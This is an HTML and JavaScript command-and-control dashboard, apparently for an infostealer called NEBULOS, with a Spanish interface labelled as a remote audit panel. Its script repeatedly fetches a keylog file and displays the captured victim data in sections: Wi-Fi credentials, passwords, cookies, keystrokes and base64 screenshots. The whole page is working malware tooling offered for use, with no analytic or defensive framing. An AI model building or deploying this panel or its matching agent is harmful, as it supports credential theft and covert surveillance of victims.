<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>NEBULOS | C2 Dashboard</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        .panel { border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 20px #030; }
        .nav { margin-bottom: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; }
        button:hover, .active { background: #0f0; color: #000; font-weight: bold; }
        #output { background: #050505; border: 1px inset #0f0; height: 500px; overflow-y: auto; padding: 15px; white-space: pre-wrap; }
        #screen-view { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
        .status { color: #888; font-size: 0.8em; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="panel">
        <h2>[ NEBULOS ] CONTROL DE AUDITORÍA REMOTA</h2>
        <div class="nav">
            <button onclick="view('full')">REPORTE</button>
            <button onclick="view('wifi')">WIFI</button>
            <button onclick="view('pass')">PASSWORDS</button>
            <button onclick="view('keys')">TECLADO</button>
            <button onclick="view('ss')">CAPTURA PANTALLA</button>
        </div>
        <div id="output">Cargando datos del agente...</div>
        <img id="screen-view" alt="Vista Remota">
        <div class="status" id="stat">Último contacto: Esperando...</div>
    </div>

<script>
    let raw = "";
    async function update() {
        try {
            const r = await fetch('keylog.txt?v=' + Math.random());
            if (r.ok) {
                raw = await r.text();
                document.getElementById('stat').textContent = "Último contacto: " + new Date().toLocaleTimeString();
                view('full');
            }
        } catch(e) {}
    }

    function view(mode) {
        const out = document.getElementById('output');
        const img = document.getElementById('screen-view');
        img.style.display = "none";
        out.style.display = "block";

        if (mode === 'wifi') out.textContent = raw.split('--- WIFI ---')[1]?.split('--- PASSWORDS ---')[0];
        else if (mode === 'pass') out.textContent = raw.split('--- PASSWORDS ---')[1]?.split('--- COOKIES ---')[0];
        else if (mode === 'keys') out.textContent = raw.split('--- KEYS ---')[1]?.split('--- SCREENSHOT ---')[0];
        else if (mode === 'ss') {
            const b64 = raw.split('--- SCREENSHOT ---')[1]?.trim();
            if (b64) {
                img.src = "data:image/png;base64," + b64;
                img.style.display = "block";
                out.style.display = "none";
            } else { out.textContent = "No hay capturas disponibles."; }
        } else { out.textContent = raw; }
    }

    setInterval(update, 30000); update();
</script>
</body>
</html>
